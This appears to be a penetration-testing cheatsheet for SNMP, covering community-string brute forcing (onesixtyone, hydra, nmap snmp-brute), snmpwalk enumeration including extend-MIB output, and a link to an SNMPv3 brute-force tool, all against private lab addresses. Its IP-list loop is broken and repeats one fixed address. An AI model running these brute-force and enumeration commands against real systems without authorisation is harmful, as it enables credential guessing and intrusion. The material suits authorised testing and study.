# SNMP Exploitation and Enumeration Cheatsheet

## Brute Force Community Strings

```bash
# Generate a list of IP addresses
for ip in $(seq 1 254); do echo 192.168.50.151; done > ips

# Use onesixtyone for brute forcing community strings
onesixtyone -c community -i ips
```

## SNMP Queries

### Normal Query

```bash
snmpwalk -c public -v1 -t 10 192.168.50.151
```

### Extended Query

```bash
snmpwalk -c public -v1 192.168.50.151 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```

### Supported Versions

- `-v1`
- `-v2c`
- `-v2u`
- `-v3`

## Nmap Scripts for SNMP

```bash
nmap -sU -p 161 --script=snmp-info 192.168.238.145
```

## Brute Force with Hydra

```bash
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.212.42 snmp
```

## SNMPv3 Brute Forcing

For SNMPv3, use the following tool:

- [SNMPv3 Brute Tool](https://github.com/applied-risk/snmpv3brute/blob/master/snmpv3brute.py)

## Nmap SNMP Brute Forcing

```bash
sudo nmap -sU -p 161 --script snmp-brute 192.168.212.42 --script-args snmp-brute.communitiesdb=/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt
```

## Bulk Walk Example

```bash
sudo snmpbulkwalk -c public -v2c 192.168.238.145 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
